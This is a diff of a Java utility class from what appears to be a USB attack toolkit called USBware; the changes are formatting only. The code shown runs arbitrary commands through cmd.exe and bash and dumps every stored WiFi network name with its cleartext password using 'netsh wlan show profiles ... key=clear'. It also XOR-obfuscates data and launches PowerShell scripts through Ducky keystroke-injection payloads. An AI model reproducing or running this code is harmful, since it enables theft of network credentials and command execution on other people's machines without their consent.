@@ -32,11 +32,11 @@ public class Utils {
 	public static String runCommand(String command) {
 		String resp="";
 		BufferedReader bufferedReader=null;
-		try {
+		try{
 			ProcessBuilder builder=new ProcessBuilder("cmd.exe", "/c", command);
 			builder.redirectErrorStream(true);
 			bufferedReader=new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
-			while(true) {
+			while(true){
 				String line=bufferedReader.readLine();
 				if(line==null)
 					break;
@@ -46,13 +46,13 @@ public class Utils {
 				return "Command did not produce a response";
 			else
 				return resp.substring(0, resp.length()-1);
-		}catch (Exception e) {
+		}catch(Exception e){
 			return "An error occurred when trying to run command";
-		}finally {
-			try {
+		}finally{
+			try{
 				if(bufferedReader!=null)
 					bufferedReader.close();
-			}catch (Exception e) {}
+			}catch(Exception e){}
 		}
 	}
 
@@ -65,11 +65,11 @@ public class Utils {
 	public static String runBashCommand(String command) {
 		String resp="";
 		BufferedReader bufferedReader=null;
-		try {
+		try{
 			ProcessBuilder builder=new ProcessBuilder("bash", "-c", command);
 			builder.redirectErrorStream(true);
 			bufferedReader=new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
-			while(true) {
+			while(true){
 				String line=bufferedReader.readLine();
 				if(line==null)
 					break;
@@ -79,13 +79,13 @@ public class Utils {
 				return "Command did not produce a response";
 			else
 				return resp.substring(0, resp.length()-1);
-		}catch (Exception e) {
+		}catch(Exception e){
 			return "An error occurred when trying to run command";
-		}finally {
-			try {
+		}finally{
+			try{
 				if(bufferedReader!=null)
 					bufferedReader.close();
-			}catch (Exception e) {}
+			}catch(Exception e){}
 		}
 	}
 
@@ -100,12 +100,12 @@ public class Utils {
 		ZipFile zip=new ZipFile(new File(zipFile));
 		new File(extractFolder).mkdir();
 		Enumeration<?> zipFileEntries=zip.entries();
-		while(zipFileEntries.hasMoreElements()) {
+		while(zipFileEntries.hasMoreElements()){
 			ZipEntry entry=(ZipEntry) zipFileEntries.nextElement();
 			File destFile=new File(extractFolder, entry.getName());
 			File destinationParent=destFile.getParentFile();
 			destinationParent.mkdirs();
-			if(!entry.isDirectory()) {
+			if(!entry.isDirectory()){
 				BufferedInputStream in=new BufferedInputStream(zip.getInputStream(entry));
 				int currentByte;
 				byte data[]=new byte[2048];
@@ -124,16 +124,16 @@ public class Utils {
 	 * @return SSID and password of current WiFi connection.
 	 */
 	public static String currentConnection() {
-		try {
+		try{
 			String interfaceInfo=runCommand("c: && cd C:\\Windows\\System32 && netsh wlan show interfaces");
-			if(interfaceInfo.contains("Profile")) {
+			if(interfaceInfo.contains("Profile")){
 				String interfaceLine=interfaceInfo.substring(interfaceInfo.lastIndexOf("Profile"));
 				String ssid=interfaceLine.substring(interfaceLine.indexOf(":")+2, interfaceLine.indexOf("\n"));
 				String pass=getPass(ssid);
 				return "SSID:\t"+ssid+"\nPass:\t"+pass;
 			}else
 				throw new Exception();
-		}catch (Exception e) {
+		}catch(Exception e){
 			return "SSID:\tN/A\nPass:\tN/A";
 		}
 	}
@@ -142,17 +142,17 @@ public class Utils {
 	 * @return All stored WiFi SSIDs along with their passwords
 	 */
 	public static String allWiFiPass() {
-		try {
+		try{
 			String ret="";
 			String profiles=Utils.runCommand("c: && cd C:\\Windows\\System32 && netsh wlan show profiles");
 			for(String profile:new ArrayList<String>(Arrays.asList(profiles.substring(profiles.indexOf(":")+1).split("\n"))))
-				if(profile.contains("Profile")&&profile.contains(":")) {
+				if(profile.contains("Profile") && profile.contains(":")){
 					String ssid=profile.substring(profile.indexOf(":")+2);
 					String pass=getPass(ssid);
 					ret+="SSID:\t"+ssid+"\nPass:\t"+pass+"\n\n";
 				}
 			return ret;
-		}catch (Exception e) {
+		}catch(Exception e){
 			return "An error occurred when trying to get SSIDs and passwords";
 		}
 	}
@@ -162,13 +162,13 @@ public class Utils {
 	 * @return password of WiFi network with SSID {@link ssid}
 	 */
 	private static String getPass(String ssid) {
-		try {
+		try{
 			String ssidInfo=runCommand("c: && cd C:\\Windows\\System32 && netsh wlan show profiles "+ssid+" key=clear | findstr Key");
-			if(ssidInfo.contains("Key Content")) {
+			if(ssidInfo.contains("Key Content")){
 				return ssidInfo.substring(ssidInfo.indexOf(":")+2);
 			}else
 				throw new Exception();
-		}catch (Exception e) {
+		}catch(Exception e){
 			return "N/A";
 		}
 	}
@@ -177,11 +177,11 @@ public class Utils {
 	 * @return Private IP address of current machine
 	 */
 	public static String getIP() {
-		try {
+		try{
 			Enumeration<NetworkInterface> majorInterfaces=NetworkInterface.getNetworkInterfaces();
-			while(majorInterfaces.hasMoreElements()) {
+			while(majorInterfaces.hasMoreElements()){
 				NetworkInterface inter=(NetworkInterface) majorInterfaces.nextElement();
-				for(Enumeration<InetAddress> minorInterfaces=inter.getInetAddresses();minorInterfaces.hasMoreElements();) {
+				for(Enumeration<InetAddress> minorInterfaces=inter.getInetAddresses();minorInterfaces.hasMoreElements();){
 					InetAddress add=(InetAddress) minorInterfaces.nextElement();
 					if(!add.isLoopbackAddress())
 						if(add instanceof Inet4Address)
@@ -191,7 +191,7 @@ public class Utils {
 				}
 			}
 			throw new Exception();
-		}catch (Exception e) {
+		}catch(Exception e){
 			USBware.error("Could not get IP address");
 			return null;
 		}
@@ -209,8 +209,8 @@ public class Utils {
 		byte[] secret=key.getBytes();
 		String output="";
 		int spos=0;
-		for(int pos=0;pos<toCrypt.length;++pos) {
-			output+=(char) ((byte) (toCrypt[pos]^secret[spos]));
+		for(int pos=0;pos<toCrypt.length;++pos){
+			output+=(char) ((byte) (toCrypt[pos] ^ secret[spos]));
 			++spos;
 			if(spos>=secret.length)
 				spos=0;
@@ -226,7 +226,7 @@ public class Utils {
 	 */
 	public static boolean runPSScript(String scriptName) {
 		Scanner in=null;
-		try {
+		try{
 			String toCopy="";
 			in=new Scanner(new File("scripts\\"+scriptName));
 			while(in.hasNextLine())
@@ -235,9 +235,9 @@ public class Utils {
 			if(!DuckyScripts.run("powershell.duck"))
 				throw new Exception();
 			return true;
-		}catch (Exception e) {
+		}catch(Exception e){
 			return false;
-		}finally {
+		}finally{
 			if(in!=null)
 				in.close();
 		}
